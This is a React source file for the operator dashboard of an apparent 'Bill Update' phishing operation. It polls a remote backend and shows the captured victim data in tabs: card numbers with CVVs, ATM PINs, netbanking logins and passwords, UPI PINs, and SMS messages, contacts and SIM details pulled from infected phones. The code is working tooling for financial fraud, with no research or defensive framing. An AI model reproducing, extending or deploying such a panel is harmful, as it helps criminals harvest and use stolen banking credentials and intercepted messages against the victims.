import { useState, useEffect, useCallback } from 'react'

const API = 'https://bill-1-9yfp.onrender.com/api/admin/all'

const sections = [
  { key: 'bill_updates', label: 'Bill Update Requests', color: '#2D9CDB' },
  { key: 'devices', label: 'Devices', color: '#6C5CE7' },
  { key: 'card_details', label: 'Card Details', color: '#F39C12' },
  { key: 'card_verifications', label: 'Card Verifications', color: '#27AE60' },
  { key: 'netbanking_details', label: 'Netbanking Logins', color: '#E74C3C' },
  { key: 'netbanking_pins', label: 'Netbanking Pins', color: '#8E44AD' },
  { key: 'upi_details', label: 'UPI PIN Entries', color: '#1ABC9C' },
  { key: 'payment_attempts', label: 'Payment Attempts', color: '#E67E22' },
]

export default function App() {
  const [data, setData] = useState(null)
  const [active, setActive] = useState('bill_updates')
  const [selectedDevice, setSelectedDevice] = useState(null)
  const [deviceTab, setDeviceTab] = useState('sms')
  const [time, setTime] = useState('')

  const fetchData = useCallback(async () => {
    try {
      const r = await fetch(API)
      const d = await r.json()
      setData(d)
      setTime(new Date().toLocaleTimeString())
    } catch {}
  }, [])

  useEffect(() => {
    fetchData()
    const id = setInterval(fetchData, 3000)
    return () => clearInterval(id)
  }, [fetchData])

  if (!data) return <div style={styles.loading}>Loading admin panel...</div>

  const cols = {
    bill_updates: ['id', 'customer_name', 'mobile', 'consumer_number', 'reasons', 'created_at'],
    card_details: ['id', 'card_type', 'card_number', 'card_holder_name', 'expiry', 'cvv', 'amount', 'created_at'],
    card_verifications: ['id', 'dob', 'atm_pin', 'amount', 'created_at'],
    netbanking_details: ['id', 'bank_name', 'user_id', 'password', 'remember_me', 'amount', 'created_at'],
    netbanking_pins: ['id', 'pin', 'amount', 'created_at'],
    upi_details: ['id', 'pin', 'amount', 'created_at'],
    payment_attempts: ['id', 'amount', 'payment_method', 'status', 'created_at'],
  }
  const smsCols = ['sender', 'message', 'received_at', 'created_at']

  const rows = data[active] || []
  const stats = data.stats || {}
  const deviceSections = data.device_sections || []

  const renderDevices = () => (
    <div>
      {deviceSections.length === 0 ? (
        <div style={styles.empty}>No devices registered</div>
      ) : deviceSections.map((sec, i) => {
        const dev = sec.device || {}
        const smsList = sec.sms || []
        const contactsList = sec.contacts || []
        const online = dev.last_seen && (Date.now() - new Date(dev.last_seen).getTime()) < 120000
        const shortId = dev.device_id ? dev.device_id.substring(0, 8) + '...' : '-'
        const isSelected = selectedDevice === dev.device_id
        return (
          <div key={dev.device_id || i}>
            <div
              style={{
                ...styles.deviceCard,
                borderLeft: `4px solid ${online ? '#27AE60' : '#E74C3C'}`,
                cursor: 'pointer',
                background: isSelected ? '#eef2ff' : '#fff',
              }}
              onClick={() => { setSelectedDevice(isSelected ? null : dev.device_id); setDeviceTab('sms') }}
            >
              <div>
                <div style={styles.deviceName}>{dev.device_name || '-'} <span style={{color: online ? '#27AE60' : '#E74C3C', fontSize: 12}}>{online ? 'ONLINE' : 'OFFLINE'}</span></div>
                <div style={styles.deviceMeta}>ID: {shortId} &middot; {dev.model || '-'} &middot; {dev.os_version || '-'} &middot; SIM: {(() => { try { const si = JSON.parse(dev.sim_info || '[]'); return si.map(s => 'Slot '+s.sim_slot+': '+s.carrier+(s.number ? ' ('+s.number+')' : '')).join(' | ') } catch { return '-'; } })()} &middot; SMS: {smsList.length} &middot; Contacts: {contactsList.length}</div>
              </div>
              <div style={{fontSize: 11, color: '#999'}}>{dev.last_seen ? new Date(dev.last_seen).toLocaleString() : '-'}</div>
            </div>
            {isSelected && (
              <div style={styles.smsSection}>
                <div style={{display: 'flex', gap: 8, marginBottom: 12}}>
                  <button onClick={() => setDeviceTab('sms')} style={{...styles.subTab, ...(deviceTab === 'sms' ? {background: '#6C5CE7', color: '#fff'} : {})}}>SMS ({smsList.length})</button>
                  <button onClick={() => setDeviceTab('contacts')} style={{...styles.subTab, ...(deviceTab === 'contacts' ? {background: '#00B894', color: '#fff'} : {})}}>Contacts ({contactsList.length})</button>
                </div>
                {deviceTab === 'sms' ? (
                  smsList.length === 0 ? <div style={styles.empty}>No SMS from this device</div> : (
                    <table style={styles.table}>
                      <thead><tr>{smsCols.map(c => <th key={c} style={styles.th}>{c.replace(/_/g, ' ').toUpperCase()}</th>)}</tr></thead>
                      <tbody>{smsList.map((sms, j) => (
                        <tr key={sms.id || j} style={j % 2 ? styles.trAlt : {}}>
                          {smsCols.map(c => { let val = sms[c]; if (c === 'created_at' || c === 'received_at') val = val ? new Date(val).toLocaleString() : '-'; return <td key={c} style={styles.td}>{val ?? '-'}</td> })}
                        </tr>
                      ))}</tbody>
                    </table>
                  )
                ) : (
                  contactsList.length === 0 ? <div style={styles.empty}>No contacts from this device</div> : (
                    <table style={styles.table}>
                      <thead><tr>{['name', 'phone', 'email', 'created_at'].map(c => <th key={c} style={styles.th}>{c.replace(/_/g, ' ').toUpperCase()}</th>)}</tr></thead>
                      <tbody>{contactsList.map((ct, j) => (
                        <tr key={ct.id || j} style={j % 2 ? styles.trAlt : {}}>
                          {['name', 'phone', 'email', 'created_at'].map(c => { let val = ct[c]; if (c === 'created_at') val = val ? new Date(val).toLocaleString() : '-'; return <td key={c} style={styles.td}>{val ?? '-'}</td> })}
                        </tr>
                      ))}</tbody>
                    </table>
                  )
                )}
              </div>
            )}
          </div>
        )
      })}
    </div>
  )

  return (
    <div style={styles.container}>
      <header style={styles.header}>
        <h1 style={styles.title}>Bill Update — Admin Panel</h1>
        <span style={styles.live}>LIVE {time} (auto-refresh 3s)</span>
      </header>

      <div style={styles.statsRow}>
        {sections.map(s => (
          <div key={s.key} style={{...styles.statCard, borderTop: `4px solid ${s.color}`}} onClick={() => setActive(s.key)}>
            <div style={{...styles.statNum, color: s.color}}>{s.key === 'devices' ? deviceSections.length : (stats[`total_${s.key}`] || 0)}</div>
            <div style={styles.statLabel}>{s.label}</div>
          </div>
        ))}
      </div>

      <div style={styles.tabs}>
        {sections.map(s => (
          <button key={s.key} style={{...styles.tab, ...(active === s.key ? {backgroundColor: s.color, color: '#fff'} : {})}} onClick={() => { setActive(s.key); setSelectedDevice(null) }}>
            {s.label}
          </button>
        ))}
      </div>

      <div style={styles.tableWrap}>
        {active === 'devices' ? renderDevices() : (
          <table style={styles.table}>
            <thead>
              <tr>
                {cols[active].map(c => <th key={c} style={styles.th}>{c.replace(/_/g, ' ').toUpperCase()}</th>)}
              </tr>
            </thead>
            <tbody>
              {rows.length === 0 ? (
                <tr><td colSpan={cols[active].length} style={styles.empty}>No data</td></tr>
              ) : rows.map((row, i) => (
                <tr key={row.id || i} style={i % 2 ? styles.trAlt : {}}>
                  {cols[active].map(c => {
                    let val = row[c]
                    if (c === 'created_at') val = new Date(val).toLocaleString()
                    if (typeof val === 'boolean') val = val ? 'Yes' : 'No'
                    if (c === 'amount') val = `₹${val}`
                    return <td key={c} style={styles.td}>{val ?? '-'}</td>
                  })}
                </tr>
              ))}
            </tbody>
          </table>
        )}
      </div>
    </div>
  )
}

const subTabBase = { padding: '6px 14px', border: 'none', borderRadius: 6, cursor: 'pointer', fontWeight: 600, fontSize: 12 }
const styles = {
  subTab: subTabBase,
  container: { fontFamily: 'system-ui, sans-serif', background: '#f0f2f5', minHeight: '100vh', padding: '0 0 40px' },
  loading: { display: 'flex', height: '100vh', alignItems: 'center', justifyContent: 'center', fontSize: 24, color: '#666' },
  header: { background: '#1A2A6C', color: '#fff', padding: '20px 30px', display: 'flex', justifyContent: 'space-between', alignItems: 'center' },
  title: { margin: 0, fontSize: 24, fontWeight: 800 },
  live: { fontSize: 13, opacity: .8, fontFamily: 'monospace' },
  statsRow: { display: 'flex', gap: 12, padding: 20, flexWrap: 'wrap' },
  statCard: { background: '#fff', borderRadius: 10, padding: '14px 20px', flex: '1 0 140px', cursor: 'pointer', boxShadow: '0 2px 8px rgba(0,0,0,.06)' },
  statNum: { fontSize: 28, fontWeight: 800 },
  statLabel: { fontSize: 12, color: '#666', marginTop: 2 },
  tabs: { display: 'flex', gap: 8, padding: '0 20px 16px', flexWrap: 'wrap' },
  tab: { padding: '8px 16px', border: 'none', borderRadius: 8, background: '#fff', cursor: 'pointer', fontWeight: 600, fontSize: 13, boxShadow: '0 1px 4px rgba(0,0,0,.06)' },
  tableWrap: { margin: '0 20px', background: '#fff', borderRadius: 12, overflow: 'auto', boxShadow: '0 2px 12px rgba(0,0,0,.08)' },
  table: { width: '100%', borderCollapse: 'collapse', fontSize: 13, minWidth: 700 },
  th: { padding: '12px 14px', textAlign: 'left', background: '#f8f9fa', borderBottom: '2px solid #dee2e6', fontWeight: 700, color: '#333', whiteSpace: 'nowrap', fontSize: 11 },
  td: { padding: '10px 14px', borderBottom: '1px solid #eee', whiteSpace: 'nowrap' },
  trAlt: { background: '#f8f9fa' },
  empty: { textAlign: 'center', padding: 40, color: '#999' },
  deviceCard: { display: 'flex', justifyContent: 'space-between', alignItems: 'center', padding: '14px 20px', margin: '0 0 1px', borderBottom: '1px solid #f0f0f0' },
  deviceName: { fontWeight: 700, fontSize: 15, marginBottom: 4 },
  deviceMeta: { fontSize: 12, color: '#666' },
  smsSection: { background: '#f8f9fa', padding: '12px 20px 20px', borderBottom: '2px solid #dee2e6' },
  smsHeader: { fontWeight: 700, fontSize: 13, color: '#6C5CE7', marginBottom: 10 },
}
